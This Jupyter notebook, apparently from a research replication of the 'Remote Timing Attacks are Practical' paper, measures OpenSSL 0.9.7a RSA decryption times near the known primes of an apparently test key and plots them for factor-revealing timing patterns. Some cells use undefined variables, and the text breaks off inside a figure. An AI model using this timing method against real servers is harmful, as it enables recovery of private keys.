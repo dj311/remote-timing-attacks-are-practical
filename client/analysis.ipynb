{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Remote Timing Attacks are Practical"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scipy\n",
    "import scipy.signal\n",
    "import seaborn\n",
    "import sympy\n",
    "import pandas\n",
    "import os\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "from IPython import display\n",
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tls\n",
    "import attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "TODO: Intro"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Theory"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "p = sympy.Integer(11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789)\n",
    "q = sympy.Integer(11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283)\n",
    "N = sympy.Integer(132762152776056020551326919245624484615462467876809681535549565118332290525598572815747323476102181376625279228965473106140757139049665124368186142774966643990206422037551427526013151129106319233128471783533673959766053786798472937188481868923726256436384468384858420931063093337134977283618537887974322079287)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploratory Analysis\n",
    "The aim of this notebook is to sample the server response times for a bunch of `g` values, and find out if the distribution is meaningfully different between them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2091863</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2244548</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>1994881</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2096223</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2178002</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>295</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2078362</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>296</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2027373</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>297</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2119538</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>298</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2072615</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>299</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2018434</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>300 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 point     time\n",
       "0    1135386043712020434853942036136729492768344192...  2091863\n",
       "1    1135386043712020434853942036136729492768344192...  2244548\n",
       "2    1135386043712020434853942036136729492768344192...  1994881\n",
       "3    1135386043712020434853942036136729492768344192...  2096223\n",
       "4    1135386043712020434853942036136729492768344192...  2178002\n",
       "..                                                 ...      ...\n",
       "295  1169312882709080067744353523763247689524710588...  2078362\n",
       "296  1169312882709080067744353523763247689524710588...  2027373\n",
       "297  1169312882709080067744353523763247689524710588...  2119538\n",
       "298  1169312882709080067744353523763247689524710588...  2072615\n",
       "299  1169312882709080067744353523763247689524710588...  2018434\n",
       "\n",
       "[300 rows x 2 columns]"
      ]
     },
     "execution_count": 129,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filename = \"./measurements/openssl-0.9.7a-2020-01-31-4-just-p-q-and-neighbours.txt\"\n",
    "\n",
    "if not os.path.exists(filename):\n",
    "    gs = attack.bruteforce_most_significant_bits(\n",
    "        num_bits=6,\n",
    "        neighbourhood_size=10,\n",
    "    )\n",
    "    \n",
    "    gs = []\n",
    "    \n",
    "    gs.append(q-1)\n",
    "    gs.append(q)\n",
    "    gs.append(q+1)\n",
    "    \n",
    "    gs.append(p-1)\n",
    "    gs.append(p)\n",
    "    gs.append(p+1)\n",
    "    \n",
    "    print(\"Taking {} samples...\".format(len(gs)*50))\n",
    "    raw_samples = attack.sample(\n",
    "        gs,\n",
    "        sample_size=50, \n",
    "        u_g=True,\n",
    "        N=N,\n",
    "   )\n",
    "    samples = pandas.DataFrame.from_records(\n",
    "        raw_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    samples.to_csv(filename, sep=\" \")\n",
    "\n",
    "else:\n",
    "    samples = pandas.read_csv(\n",
    "        filename,\n",
    "        sep=\" \",\n",
    "        usecols=[\"point\", \"time\"],\n",
    "    )\n",
    "\n",
    "samples['point'] = samples['point'].apply(sympy.Integer)\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As in the paper, we avoid outliers by taking the median time for each point."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2082610.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>1394011.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2086890.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2081368.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>1395154.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2073345.5</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               point       time\n",
       "0  1135386043712020434853942036136729492768344192...  2082610.0\n",
       "1  1135386043712020434853942036136729492768344192...  1394011.0\n",
       "2  1135386043712020434853942036136729492768344192...  2086890.5\n",
       "3  1169312882709080067744353523763247689524710588...  2081368.5\n",
       "4  1169312882709080067744353523763247689524710588...  1395154.5\n",
       "5  1169312882709080067744353523763247689524710588...  2073345.5"
      ]
     },
     "execution_count": 130,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"point\").median().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can group samples into their respective \"neighbourhoods\" considering their most significant bits only."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [],
   "source": [
    "NUM_BITS = 512\n",
    "\n",
    "def point_to_neighbourhood(point):\n",
    "    point_int = sympy.Integer(point)\n",
    "    point_bits = attack.sympy_integer_to_bits(point_int)\n",
    "    neighbourhood_point_bits = point_bits[0:NUM_BITS] + [0] * (512-NUM_BITS)\n",
    "    neighbourhood_point_int = attack.bits_to_sympy_integer(neighbourhood_point_bits)\n",
    "    return neighbourhood_point_int\n",
    "\n",
    "samples['neighbourhood'] = samples['point'].apply(point_to_neighbourhood)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sum together the measurements in each neighbourhood:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2082610.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>1394011.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2086890.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2081368.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>1395154.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2073345.5</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                       neighbourhood       time\n",
       "0  1135386043712020434853942036136729492768344192...  2082610.0\n",
       "1  1135386043712020434853942036136729492768344192...  1394011.0\n",
       "2  1135386043712020434853942036136729492768344192...  2086890.5\n",
       "3  1169312882709080067744353523763247689524710588...  2081368.5\n",
       "4  1169312882709080067744353523763247689524710588...  1395154.5\n",
       "5  1169312882709080067744353523763247689524710588...  2073345.5"
      ]
     },
     "execution_count": 133,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"neighbourhood\").mean().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since we know the factors of `N` (`q` and `p` with `q<p`) we can consider each point relative in size to these factors. When plotting, we are looking for peaks and troughs near whole multples of `p` and `q`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "      <th>point_relative_to_sqrt_n</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2082610.0</td>\n",
       "      <td>0.98539</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>1394011.0</td>\n",
       "      <td>0.98539</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1135386043712020434853942036136729492768344192...</td>\n",
       "      <td>2086890.5</td>\n",
       "      <td>0.98539</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2081368.5</td>\n",
       "      <td>1.01483</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>1395154.5</td>\n",
       "      <td>1.01483</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1169312882709080067744353523763247689524710588...</td>\n",
       "      <td>2073345.5</td>\n",
       "      <td>1.01483</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                       neighbourhood       time  \\\n",
       "0  1135386043712020434853942036136729492768344192...  2082610.0   \n",
       "1  1135386043712020434853942036136729492768344192...  1394011.0   \n",
       "2  1135386043712020434853942036136729492768344192...  2086890.5   \n",
       "3  1169312882709080067744353523763247689524710588...  2081368.5   \n",
       "4  1169312882709080067744353523763247689524710588...  1395154.5   \n",
       "5  1169312882709080067744353523763247689524710588...  2073345.5   \n",
       "\n",
       "   point_relative_to_sqrt_n  \n",
       "0                   0.98539  \n",
       "1                   0.98539  \n",
       "2                   0.98539  \n",
       "3                   1.01483  \n",
       "4                   1.01483  \n",
       "5                   1.01483  "
      ]
     },
     "execution_count": 135,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqrt_N = sympy.sqrt(N)\n",
    "samples['point_relative_to_sqrt_n'] = samples['neighbourhood'].apply(lambda g: round(float(g/sqrt_N), 5))\n",
    "samples"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [],
   "source": [
    "q_relative_to_sqrt_n = round(float(q/sqrt_N), 5)\n",
    "p_relative_to_sqrt_n = round(float(p/sqrt_N), 5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now plot the media response time as we vary `g`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [],
   "source": [
    "smallest_time_observed = samples['time'].min()\n",
    "largest_time_observed = samples['time'].max()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72c2a038d0>"
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8)\n",
    "g.set(ylim=(smallest_time_observed*0.9, largest_time_observed*1.1))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72c296f850>"
      ]
     },
     "execution_count": 139,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8)\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "g.set(ylim=(smallest_time_observed*0.9, largest_time_observed*1.1))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72c264fd10>"
      ]
     },
     "execution_count": 140,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8)\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "g.set(ylim=(smallest_time_observed*0.9, largest_time_observed*1.1))\n",
    "g.set(xlim=(q_relative_to_sqrt_n*0.9, p_relative_to_sqrt_n*1.1))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Figure 2\n",
    "\n",
    "#### (a) The time variance for decrypting a particular ciphertext decreases as we increase the number of samples taken."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "samples_indices = list(range(2,1000))\n",
    "\n",
    "variances = {}\n",
    "for i in samples_indices:\n",
    "    variances[i] = []\n",
    "\n",
    "for point in set(clean_samples['point']):\n",
    "    point_samples = clean_samples[clean_samples['point'] == point].copy()\n",
    "\n",
    "    for i in samples_indices:\n",
    "        variances[i].append(point_samples['time'][0:i].std()**2)\n",
    "\n",
    "avg_variances = []\n",
    "num_samples = []\n",
    "\n",
    "for number_of_samples, all_variances in variances.items():\n",
    "    avg_variances.append(sum(all_variances)/float(len(all_variances)))\n",
    "    num_samples.append(number_of_samples)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f5e6f561ed0>"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "seaborn.relplot(\n",
    "    kind='line',\n",
    "    x='num_samples',\n",
    "    y='variance',\n",
    "    data=pandas.DataFrame({'num_samples': num_samples, 'variance': avg_variances}),\n",
    "    height=8,\n",
    "    aspect=16/8,\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Taking 1000 samples sees the variance increase over time. This is in contrast to Figure 2 (a) in the paper. Here we plot the variance over the same range of samples, for a more direct comparison:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f5e76824c90>"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "seaborn.relplot(\n",
    "    kind='line',\n",
    "    x='num_samples',\n",
    "    y='variance',\n",
    "    data=pandas.DataFrame({'num_samples': num_samples[0:14], 'variance': avg_variances[0:14]}),\n",
    "    height=8,\n",
    "    aspect=16/8,\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I'm not really sure what this means: should I stop sampling earlier? Would that improve my results? This seems to contradict my theoretical understanding (more samples is better). But maybe there are unintended affects of taking many samples _in a row_. E.g. caching and other things which mean the values go down consideralby after a x many consecutive calls."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Plot the Figure 1 graphs again, but only taking into account the first 15 samples of each point:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "reduced_samples = {'point': [], 'time': []}\n",
    "\n",
    "for point in set(clean_samples['point']):\n",
    "    first_15 = clean_samples[clean_samples['point'] == point][0:15]\n",
    "    reduced_samples['point'] += list(first_15['point'])\n",
    "    reduced_samples['time'] += list(first_15['time'])\n",
    "    \n",
    "reduced_samples = pandas.DataFrame(reduced_samples)\n",
    "reduced_samples['point_relative_to_p'] = reduced_samples['point'].apply(lambda g: round(float(g/p), 5))\n",
    "reduced_samples['point_relative_to_q'] = reduced_samples['point'].apply(lambda g: round(float(g/q), 5))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f5e6f9ac750>"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=reduced_samples, x='point_relative_to_q', y='time', kind='line', height=8, aspect=16/8)\n",
    "plt.plot([1, 1], [min(get_mean.values())*0.9, max(get_mean.values())*1.1], color='green')\n",
    "g.set(xlim=(0.5, 2.5))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f5e6f8e77d0>"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=reduced_samples, x='point_relative_to_p', y='time', kind='line', height=8, aspect=16/8)\n",
    "plt.plot([1, 1], [min(get_mean.values())*0.9, max(get_mean.values())*1.1], color='green')\n",
    "g.set(xlim=(0.5, 2.5))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Our `p` and `q` values are much closer (`p<2q`) than those used for Figure 1 in the paper. The shape below shows how the number of reductions varies `mod p`, `mod q`, and `mod pq`. It shows how the graphs interfere with one another when `p` and `q` are close."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/svg+xml": [
       "<svg height=\"391px\" style=\"background-color: rgb(255, 255, 255);\" version=\"1.1\" viewBox=\"-0.5 -0.5 737 391\" width=\"737px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><defs/><g><path d=\"M 50 350 L 50 10\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#000000\" stroke-dasharray=\"3 3\" stroke-miterlimit=\"10\"/><path d=\"M 10 310 L 550 310\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#000000\" stroke-dasharray=\"3 3\" stroke-miterlimit=\"10\"/><path d=\"M 250 350 L 250 310\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#000000\" stroke-miterlimit=\"10\"/><path d=\"M 210 350 L 210 310\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#000000\" stroke-miterlimit=\"10\"/><path d=\"M 370 350 L 370 310\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#000000\" stroke-miterlimit=\"10\"/><path d=\"M 450 350 L 450 310\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#000000\" stroke-miterlimit=\"10\"/><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"40\" x=\"30\" y=\"360\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 370px; margin-left: 32px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: center; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; \">0</div></div></div></foreignObject><text fill=\"#000000\" font-family=\"Helvetica\" font-size=\"12px\" text-anchor=\"middle\" x=\"50\" y=\"374\">0</text></switch></g><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"40\" x=\"190\" y=\"360\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 370px; margin-left: 192px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: center; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #B5739D; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \">q</div></div></div></foreignObject><text fill=\"#B5739D\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" text-anchor=\"middle\" x=\"210\" y=\"374\">q</text></switch></g><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"40\" x=\"230\" y=\"360\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 370px; margin-left: 232px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: center; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #57B041; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \">p</div></div></div></foreignObject><text fill=\"#57B041\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" text-anchor=\"middle\" x=\"250\" y=\"374\">p</text></switch></g><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"40\" x=\"350\" y=\"360\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 370px; margin-left: 352px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: center; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #B5739D; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \">2q</div></div></div></foreignObject><text fill=\"#B5739D\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" text-anchor=\"middle\" x=\"370\" y=\"374\">2q</text></switch></g><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"40\" x=\"430\" y=\"360\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 370px; margin-left: 432px;\" 